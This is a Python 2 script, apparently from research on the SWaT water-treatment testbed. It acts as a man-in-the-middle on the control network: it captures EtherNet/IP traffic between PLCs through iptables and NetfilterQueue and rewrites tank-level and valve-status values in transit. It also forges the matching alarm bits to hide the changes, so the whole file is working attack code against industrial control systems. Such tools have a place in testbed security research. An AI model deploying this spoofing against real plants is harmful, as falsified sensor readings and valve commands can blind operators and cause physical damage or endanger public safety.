#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Copyright (c) 2017 Francisco Furtado, francisco_dos@sutd.edu.sg
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER

# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.

from netfilterqueue import NetfilterQueue
import os, sys, argparse, struct, binascii
import datetime, ctypes, random
from time import sleep

from time import time as ts

from scapy import all as scapy_all
from scapy.layers.inet import IP
from scapy.layers.inet import UDP
from enip_swat import *
from scapy.all import *
import cip,enip_tcp

value = []
mutation = []
device = []
src = []
dst = []

def __extract(packet):
    global mutation
    global value
    global device
    # global src
    # global dst

    pkt = IP(packet.get_payload())
       
    if 'LIT' in device:

        #LIT mutation
        if (str(pkt.src) == '192.168.1.30' and enip_tcp.ENIP_SendRRData in pkt and str(pkt.dst) == '192.168.1.10'):
            ind = device.index('LIT')
            mut = mutation[ind]
            val = value[ind]
            if SWAT_LIT in pkt:

                true_value_tank = inthexToHex(pkt[SWAT_LIT].Pv)
                if mut in ('ASD','ALD','ARD'):
                    mutate_value_tank = true_value_tank + val
                elif mut in ('STZ','STO','STS'): 
                    mutate_value_tank = val
                elif mut == 'BSL': 
                    shift = rol(pkt[SWAT_LIT].Pv,val,32)
                    mutate_value_tank = inthexToHex(shift)
                elif mut == 'BSR': 
                    shift = ror(pkt[SWAT_LIT].Pv,val,32)
                    mutate_value_tank = inthexToHex(shift)

                pkt[SWAT_LIT].Pv = hexTointhex(mutate_value_tank)
                pkt[SWAT_LIT].Sim_Pv = hexTointhex(mutate_value_tank)

                # set correct alarms for mutated value
                if int(float(mutate_value_tank)) < 250:
                    pkt[SWAT_LIT].control = 1
                    pkt[SWAT_LIT].AHH = 0
                    pkt[SWAT_LIT].AH = 0
                    pkt[SWAT_LIT].AL = 1
                    pkt[SWAT_LIT].ALL = 1
                elif int(float(mutate_value_tank)) < 800:
                    pkt[SWAT_LIT].control = 1
                    pkt[SWAT_LIT].AHH = 0
                    pkt[SWAT_LIT].AH = 0
                    pkt[SWAT_LIT].AL = 1
                    pkt[SWAT_LIT].ALL = 0
                elif int(float(mutate_value_tank)) > 1200:
                    pkt[SWAT_LIT].control = 1
                    pkt[SWAT_LIT].AHH = 1
                    pkt[SWAT_LIT].AH = 1
                    pkt[SWAT_LIT].AL = 0
                    pkt[SWAT_LIT].ALL = 0
                elif int(float(mutate_value_tank)) > 1000:
                    pkt[SWAT_LIT].control = 1
                    pkt[SWAT_LIT].AHH = 0
                    pkt[SWAT_LIT].AH = 1
                    pkt[SWAT_LIT].AL = 0
                    pkt[SWAT_LIT].ALL = 0

                del pkt[TCP].chksum  # Need to recompute checksum
                del pkt[IP].chksum
                pkt.show2()
                packet.set_payload(str(pkt)) #manipulated packet

                spoofed_measurement =  inthexToHex(pkt[SWAT_LIT].Sim_Pv)
                print('Changed packet from LIT %1.4f to %1.4f ' % (true_value_tank,spoofed_measurement))
                print ("PKT from %s to %s" %(pkt.src,pkt.dst))

    if 'MV' in device:

        # MV Mutation
        if (str(pkt.src) == '192.168.1.20' and enip_tcp.ENIP_SendRRData in pkt and str(pkt.dst) == '192.168.1.10'):
            ind = device.index('MV')
            mut = mutation[ind]
            val = value[ind]
            if SWAT_MV in pkt:
                true_value_motor = pkt[SWAT_MV].status

                if mut in ('ASD','ALD','ARD'):
                    mutate_value_motor = true_value_motor + val
                    if mutate_value_motor > 255:
                        mutate_value_motor = 255
                    elif mutate_value_motor < 0:
                        mutate_value_motor = 0
                elif mut in ('STZ','STO','STS'): 
                    mutate_value_motor = val
                    if mutate_value_motor > 255:
                        mutate_value_motor = 255
                    elif mutate_value_motor < 0:
                        mutate_value_motor = 0
                elif mut == 'BSL': 
                    shift = rol(pkt[SWAT_MV].status,val,8)
                    mutate_value_motor = shift
                elif mut == 'BSR': 
                    shift = ror(pkt[SWAT_MV].status,val,8)
                    mutate_value_motor = shift

                pkt[SWAT_MV].status = mutate_value_motor
                pkt[SWAT_MV].cmd = mutate_value_motor

                del pkt[TCP].chksum  # Need to recompute checksum
                del pkt[IP].chksum

                pkt.show2()
                packet.set_payload(str(pkt)) #manipulated packet

                spoofed_measurement =  pkt[SWAT_MV].status
                print('Changed packet from MV %1.4f to %1.4f ' % (true_value_motor,spoofed_measurement))
                print ("packet from %s to %s" %(pkt.src,pkt.dst))

            
         
    # then, let the netfilterqueue forward the packet   
    packet.accept()
    
def inthexToHex(value):
    value = hex(value)
    value = value[2:]
    value = value[6]+value[7]+value[4]+value[5]+value[2]+value[3]+value[0]+value[1]
    return struct.unpack('<f',binascii.unhexlify(value))[0]

def hexTointhex(value):
    hexVal = binascii.hexlify(struct.pack('<f',value))
    hexVal = str(hexVal)
    hexVal = hexVal[6]+hexVal[7]+hexVal[4]+hexVal[5]+hexVal[2]+hexVal[3]+hexVal[0]+hexVal[1]
    print(hexVal)
    return int(hexVal,16)

# Rotate left: 0b1001 --> 0b0011
rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
 
# Rotate right: 0b1001 --> 0b1100
ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))
        
def start():
    __setdown()
    __setup()
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, __extract)
    #nfqueue.bind(1, __extract)
   
    try:
        print("[*] starting NFQUEUE")
        nfqueue.run()
    except KeyboardInterrupt:
        __setdown()
        print("[*] stopping NFQUEUE")
        nfqueue.unbind()  
    return 1

def __setup():
    # change network interface 
    os.system('iptables -A FORWARD -p tcp -m physdev --physdev-in enp0s3 -j NFQUEUE --queue-num 0') #incoming
    #os.system('iptables -A FORWARD -p tcp -m physdev --physdev-in enp0s8 -j NFQUEUE --queue-num 0') #outgoing


def __setdown():
    sleep(1) # wait for one second before stopping the attack
    os.system('sudo iptables -F')

def menu():
    dev = raw_input('Enter device tag: ')
    mut = raw_input('Enter mutation code: ')
    if mut in ('ASD','ALD'):
        val = float(raw_input('Enter modifying value: '))
    elif mut in ('ARD','STR'):
        if dev == 'LIT':
            mini = raw_input('Enter minimum value: ')
            maxi = raw_input('Enter maximum value: ')
            val = random.uniform(mini, maxi)
        elif dev == 'MV':
            val = random.uniform(0, 255)
    elif mut =='STZ':
        val = 0
    elif mut =='STO':
        val = 1
    elif mut =='STS':
        val = float(raw_input('Enter set value: '))
    elif mut in ('BSL','BSR'):
        if dev == 'LIT':
            val = int(raw_input('Enter shifting value (max:32bits): '))
        elif dev == 'MV':
            val = int(raw_input('Enter shifting value (max:8bits): '))

    return (dev, mut, val)



if __name__ == '__main__':
    pt = int(raw_input('Enter number of points of mutation: '))
    for i in range(pt):
        print ("For Point %i >>>") %(i+1)
        dev, mut, val = menu()
        device.append(dev)
        mutation.append(mut)
        value.append(val)

    # sys.exit()

    print device
    print mutation
    print value

    sys.exit(start())